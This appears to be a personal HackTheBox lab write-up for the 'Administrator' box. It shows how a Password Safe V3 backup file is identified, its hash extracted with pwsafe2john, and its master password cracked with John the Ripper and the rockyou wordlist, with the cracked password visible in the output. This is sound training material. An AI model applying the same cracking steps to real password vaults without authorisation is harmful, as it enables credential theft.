
https://pwsafe.org/quickstart.shtml

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ file Backup.psafe3   
Backup.psafe3: Password Safe V3 database
```

installing passwordsafe
```
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ sudo apt install passwordsafe 
```

pwsafe

![[../../Boxes/HackTheBox/Administrator (Done)/Images/Pasted image 20250813152333.png]]

password required

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ pwsafe2john Backup.psafe3 
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

```
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ pwsafe2john Backup.psafe3 > pwsafe.hash
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash
Created directory: /home/fixit42/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-08-13 15:26) 3.333g/s 27306p/s 27306c/s 27306C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![[../../Boxes/HackTheBox/Administrator (Done)/Images/Pasted image 20250813153353.png]]


